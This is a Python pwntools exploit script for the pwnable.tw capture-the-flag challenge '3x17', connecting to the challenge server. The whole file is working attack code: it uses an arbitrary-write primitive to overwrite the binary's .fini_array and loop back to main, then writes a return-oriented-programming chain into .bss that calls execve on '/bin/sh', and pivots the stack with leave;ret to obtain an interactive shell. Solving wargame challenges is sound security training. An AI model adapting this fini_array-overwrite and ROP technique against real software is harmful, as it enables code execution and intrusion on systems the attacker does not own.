#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./3x17')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10105)

fini_addr = 0x0000000000402960
fini_array = 0x00000000004B40F0
main_addr = 0x0000000000401B6D
bss_buf = 0x000000004b4000

def arb_write(addr, data):
    sa('addr:', str(addr).ljust(0x10, '\x00'))
    sa('data:', data.ljust(0x10, '\x00'))

# create loop
#gdb.attach(p, 'b *0x0000000000401B00\nb *0x0000000000401580\nc')
arb_write(fini_array, up64(fini_addr) + up64(main_addr))

# write rop chain
pop_rax_ret = 0x000000000041e4af
pop_rdi_ret = 0x0000000000401696
pop_rsi_ret = 0x0000000000406c30
pop_rdx_ret = 0x0000000000446e35
syscall = 0x00000000004022b4
ret = 0x0000000000401016
pop_rsp_ret = 0x0000000000402ba9
arb_write(bss_buf + 0x200, '/bin/sh\x00')
arb_write(bss_buf + 0x100, up64(0x3b))
arb_write(bss_buf + 0x108, up64(pop_rdi_ret) + up64(bss_buf + 0x200))
arb_write(bss_buf + 0x118, up64(pop_rsi_ret) + up64(0x0))
arb_write(bss_buf + 0x128, up64(pop_rdx_ret) + up64(0x0))
arb_write(bss_buf + 0x138, up64(syscall))

# trigger rop
#gdb.attach(p, 'b *0x0000000000401c4b\nb *0x0000000000402ba9\nc')
leave_ret = 0x0000000000401c4b
arb_write(fini_array, up64(leave_ret) + up64(pop_rax_ret))

p.interactive()

